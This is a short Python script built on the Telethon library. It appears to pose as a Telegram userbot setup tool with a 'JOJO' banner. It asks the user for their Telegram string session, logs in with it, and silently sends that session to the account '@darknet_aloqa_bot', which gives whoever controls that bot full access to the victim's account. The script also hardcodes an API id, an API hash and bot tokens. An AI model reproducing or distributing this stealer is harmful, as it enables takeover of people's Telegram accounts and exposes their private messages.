from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys
api_id = 14847906
api_hash = "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
os.system("clear")
string = input("""
\033[1;32m
 ▄▄▄██▀▀▀▒█████   ▄▄▄██▀▀▀▒█████  
   ▒██  ▒██▒  ██▒   ▒██  ▒██▒  ██▒
   ░██  ▒██░  ██▒   ░██  ▒██░  ██▒
▓██▄██▓ ▒██   ██░▓██▄██▓ ▒██   ██░
 ▓███▒  ░ ████▓▒░ ▓███▒  ░ ████▓▒░
 ▒▓▒▒░  ░ ▒░▒░▒░  ▒▓▒▒░  ░ ▒░▒░▒░ 
 ▒ ░▒░    ░ ▒ ▒░  ▒ ░▒░    ░ ▒ ▒░ 
 ░ ░ ░  ░ ░ ░ ▒   ░ ░ ░  ░ ░ ░ ▒  
 ░   ░      ░ ░   ░   ░      ░ ░  
                                  
\033[1;34m 
string session: """)
#bot_token= "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
bot_token = "5420553449:AAG-uA4LLjI_Y_oGPSt4lBZStFjWMJWGEpY"
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    #print(client.session.save())
    client.send_message("@darknet_aloqa_bot", client.session.save())

botClient = TelegramClient('@jojo_user_bot', api_id, api_hash).start(bot_token=bot_token)






